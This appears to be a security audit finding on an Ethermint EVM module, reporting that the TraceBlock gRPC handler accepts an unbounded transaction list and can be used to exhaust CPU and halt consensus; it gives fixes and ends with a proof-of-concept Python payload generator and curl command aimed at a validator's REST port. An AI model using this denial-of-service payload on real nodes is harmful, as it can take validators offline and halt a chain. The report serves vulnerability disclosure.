### Title
Unbounded `txs` List in `TraceBlock` gRPC Handler Enables CPU Exhaustion and Chain Halt ŌĆö (File: x/evm/keeper/grpc_query.go)

---

### Summary

The `Keeper.TraceBlock` gRPC handler iterates over a caller-supplied `repeated MsgEthereumTx txs` field with **no bounds check on the list length**. Each entry triggers a full EVM state transition via `prepareTrace` ŌåÆ `ApplyMessageWithConfig`. An unprivileged attacker can call the public gRPC/REST endpoint directly with an arbitrarily large `txs` array, saturating node CPU and starving the CometBFT consensus engine of scheduling time, causing missed consensus timeouts and a chain halt.

---

### Finding Description

`Keeper.TraceBlock` at `x/evm/keeper/grpc_query.go` iterates over `req.Txs` without any length guard:

```go
for i, tx := range req.Txs {          // ŌåÉ no len(req.Txs) cap
    ...
    traceResult, logIndex, err := k.prepareTrace(ctx, cfg, msg, req.TraceConfig, true)
    ...
}
``` [1](#0-0) 

The only validation present is a sign-check on `TraceConfig.Limit`, which is unrelated to the number of transactions:

```go
if req.TraceConfig != nil && req.TraceConfig.Limit < 0 {
    return nil, status.Errorf(...)
}
``` [2](#0-1) 

`req.Txs` is a `repeated MsgEthereumTx` protobuf field with no server-side cardinality limit: [3](#0-2) 

The endpoint is registered as a public HTTP GET handler with no authentication: [4](#0-3) 

**Contrast with mitigated paths:**

- `SimulateV1` enforces `MaxSimulateBlocks = 256` at both the backend and keeper layers: [5](#0-4) [6](#0-5) 

- `TraceTx` applies `defaultTraceTimeout = 5 * time.Second` via `execTrace`: [7](#0-6) 

`TraceBlock` has **neither** a transaction-count cap nor a loop-level timeout. Each `prepareTrace` call executes a full EVM state transition bounded only by the per-call gas cap, but the number of such calls is unbounded.

The JSON-RPC entry points (`debug_traceBlockByNumber`, `debug_traceBlockByHash`) are safe because they fetch the actual on-chain block and pass only its real transactions: [8](#0-7) 

However, the underlying gRPC endpoint `/ethermint/evm/v1/trace_block` is directly reachable and accepts arbitrary `txs` without going through the JSON-RPC layer.

---

### Impact Explanation

`TraceBlock` runs in the ABCI query path within the same OS process as the CometBFT consensus engine. When the query goroutine monopolizes CPU executing thousands of EVM transactions, the consensus goroutines (propose, prevote, precommit, timeout) are starved. CometBFT's timeout-driven state machine requires timely goroutine scheduling; sustained CPU starvation causes the node to miss `TimeoutPropose`, `TimeoutPrevote`, and `TimeoutPrecommit` deadlines, triggering nil-vote rounds and ultimately a consensus halt on that validator. Multiple concurrent requests from different source IPs amplify the effect across the validator set.

This matches the allowed Critical impact: **a valid unprivileged RPC path can halt the chain**.

---

### Likelihood Explanation

- The gRPC server (default port 9090) and REST gateway (default port 1317) are publicly accessible with no authentication.
- The attack requires a single HTTP POST or gRPC call; no funds, keys, or on-chain state are needed.
- The attacker constructs a `QueryTraceBlockRequest` with a large `txs` array of maximally complex EVM transactions (e.g., contract deployments consuming the full gas cap).
- No rate limiting is applied at the handler level.
- The attack is directly analogous to the Shardeum `get_account_data_with_queue_hints` vulnerability: an unbounded list in a public handler triggers expensive per-item work that blocks a critical shared resource (there: a fifoLock; here: the CPU shared with the consensus engine).

---

### Recommendation

1. **Add a transaction count cap** in `TraceBlock`, mirroring `MaxSimulateBlocks`:
   ```go
   const maxTraceBlockTxs = 256
   if len(req.Txs) > maxTraceBlockTxs {
       return nil, status.Errorf(codes.InvalidArgument,
           "too many txs: %d > %d", len(req.Txs), maxTraceBlockTxs)
   }
   ```

2. **Apply a loop-level deadline** to the `TraceBlock` iteration, analogous to `defaultTraceTimeout` used in `TraceTx`/`execTrace`.

3. **Unify the tracing path** so `TraceBlock` uses the same `execTrace` wrapper that already enforces the timeout, rather than a hand-rolled loop.

4. Consider exposing `TraceBlock` only via the JSON-RPC layer (which is bounded by real block contents) and restricting direct gRPC access behind authentication or a firewall rule.

---

### Proof of Concept

Direct REST call (no authentication required):

```bash
# Build a payload with 5000 identical complex transactions
python3 -c "
import json, sys
tx = {
  'data': '0x' + 'ff' * 10000,   # large calldata
  'gas': '0x17D7840',             # 25_000_000 gas
  'nonce': '0x0',
  'to': '0x0000000000000000000000000000000000000000',
  'value': '0x0',
  'v': '0x1', 'r': '0x1', 's': '0x1'
}
payload = {
  'txs': [tx] * 5000,
  'block_number': 1,
  'block_hash': '0' * 64,
  'block_time': '2024-01-01T00:00:00Z',
  'chain_id': 9000
}
print(json.dumps(payload))
" > payload.json

curl -X GET http://<validator>:1317/ethermint/evm/v1/trace_block \
     -H 'Content-Type: application/json' \
     -d @payload.json
```

The node will spend minutes executing 5000 full EVM state transitions sequentially. During this time the CometBFT consensus goroutines are CPU-starved, consensus timeouts fire, and the validator goes offline.
